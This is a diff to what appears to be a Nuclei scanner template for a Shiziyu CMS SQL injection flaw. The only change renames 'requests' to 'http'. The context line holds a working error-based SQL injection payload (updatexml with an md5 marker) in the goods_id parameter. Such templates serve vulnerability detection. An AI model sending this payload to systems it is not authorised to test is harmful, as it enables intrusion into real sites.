@@ -8,7 +8,7 @@ info:
     - https://github.com/govbk/WIKI-POC-EXP/blob/7d1194429dab9f9dd8139408e79b70ddb41a468f/PeiQi_Wiki/CMS%E6%BC%8F%E6%B4%9E/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS/%E7%8B%AE%E5%AD%90%E9%B1%BCCMS%20ApiController.class.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
   tags: shiziyu,sqli
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)"
